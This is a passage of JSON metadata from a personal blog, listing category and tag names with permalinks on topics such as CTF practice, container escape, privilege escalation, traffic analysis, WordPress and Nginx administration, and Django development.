tari.moe/categories/SDL/"},{"name":"威胁建模","slug":"SDL/威胁建模","permalink":"https://tari.moe/categories/SDL/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"},{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"流量分析/Wireshark","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/"},{"name":"MISC","slug":"流量分析/Wireshark/MISC","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/MISC/"},{"name":"开发","slug":"开发","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"开发/Python","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/"},{"name":"Django","slug":"开发/Python/Django","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Python/Django/"},{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"},{"name":"小记","slug":"小记","permalink":"https://tari.moe/categories/%E5%B0%8F%E8%AE%B0/"},{"name":"入门","slug":"ctf/入门","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"},{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"运维/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"},{"name":"Wordpress","slug":"开发/Wordpress","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Wordpress/"},{"name":"Nginx","slug":"运维/Nginx","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Nginx/"},{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"},{"name":"SSH","slug":"运维/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"},{"name":"备份","slug":"运维/备份","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/%E5%A4%87%E4%BB%BD/"},{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"},{"name":"Motrix","slug":"日常折腾/Motrix","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/"},{"name":"aria2","slug":"日常折腾/Motrix/aria2","permalink":"https://tari.moe/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/Motrix/aria2/"},{"name":"MySQL","slug":"运维/MySQL","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/MySQL/"},{"name":"PHP","slug":"运维/PHP","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/PHP/"},{"name":"vsftpd","slug":"运维/vsftpd","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/vsftpd/"}],"tags":[{"name":"云安全","slug":"云安全","permalink":"https://tari.moe/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://tari.moe/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"Docker","slug":"Docker","permalink":"https://tari.moe/tags/Docker/"},{"name":"Linux命名空间","slug":"Linux命名空间","permalink":"https://tari.moe/tags/Linux%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"name":"CISP","slug":"CISP","permalink":"https://tari.moe/tags/CISP/"},{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"后渗透","slug":"后渗透","permalink":"https://tari.moe/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"权限提升","slug":"权限提升","permalink":"https://tari.moe/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"vulnhub","slug":"vulnhub","permalink":"https://tari.moe/tags/vulnhub/"},{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://tari.moe/tags/sqli-labs/"},{"name":"GraphQL","slug":"GraphQL","permalink":"https://tari.moe/tags/GraphQL/"},{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"},{"name":"HTB","slug":"HTB","permalink":"https://tari.moe/tags/HTB/"},{"name":"人工智能","slug":"人工智能","permalink":"https://tari.moe/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"ignition","slug":"ignition","permalink":"https://tari.moe/tags/ignition/"},{"name":"Laravel8","slug":"Laravel8","permalink":"https://tari.moe/tags/Laravel8/"},{"name":"面白i安全小记","slug":"面白i安全小记","permalink":"https://tari.moe/tags/%E9%9D%A2%E7%99%BDi%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/"},{"name":"中国菜刀","slug":"中国菜刀","permalink":"https://tari.moe/tags/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"hackme","slug":"hackme","permalink":"https://tari.moe/tags/hackme/"},{"name":"SDL","slug":"SDL","permalink":"https://tari.moe/tags/SDL/"},{"name":"威胁建模","slug":"威胁建模","permalink":"https://tari.moe/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"},{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://tari.moe/tags/Wireshark/"},{"name":"MISC","slug":"MISC","permalink":"https://tari.moe/tags/MISC/"},{"name":"Python","slug":"Python","permalink":"https://tari.moe/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://tari.moe/tags/Django/"},{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"},{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"},{"name":"日常折腾","slug":"日常折腾","permalink":"https://tari.moe/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"}]}